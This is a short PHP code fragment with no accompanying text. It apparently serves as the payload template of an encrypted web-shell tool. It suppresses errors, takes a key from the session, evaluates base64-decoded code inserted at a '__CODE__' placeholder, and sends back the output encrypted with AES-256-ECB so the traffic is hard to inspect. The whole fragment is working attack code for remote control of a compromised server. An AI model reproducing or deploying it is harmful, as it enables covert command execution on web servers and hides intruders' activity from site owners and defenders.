
error_reporting(0);
$k = $_SESSION['key'];
session_write_close();
$data = array(
    "status" => true,
    "result" => "",
);

ob_start();
eval(base64_decode('__CODE__'));
$data["result"] = ob_get_contents();
ob_end_clean();
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $k);
